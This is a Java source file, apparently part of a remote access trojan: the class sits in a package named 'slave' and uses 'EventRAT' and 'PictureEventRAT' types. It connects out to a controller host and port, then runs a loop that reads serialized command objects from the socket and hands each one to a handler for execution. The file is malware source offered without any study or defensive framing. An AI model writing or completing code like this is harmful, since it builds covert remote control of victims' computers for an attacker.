package slave;

import java.awt.AWTException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import netPack.EventRAT;
import netPack.PictureEventRAT;

public class CommandThreadReceiver extends Thread {
	
	private String host;
	private int port;
	private boolean run;
	private Socket s;
	private ObjectInputStream oin;
	private ObjectOutputStream oout;
	private EventRATHandler erh;
	
	public CommandThreadReceiver(String host, int port){
		this.host = host;
		this.port = port;
		
		erh = new EventRATHandler();
	}
	public void run(){
		run = true;
		EventRAT eventIn;
		
		try {
			s = new Socket(host,port);
			
			oout = new ObjectOutputStream(s.getOutputStream());
			oout.flush();
			oin = new ObjectInputStream(s.getInputStream());
			
			while(run && ((eventIn = (EventRAT)oin.readObject()) != null)){
				//And now handle the event that got
				System.out.println("[INFO] - start command");
				erh.handleEvent(eventIn);
				System.out.println("[INFO] - stop command");
			}
			
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
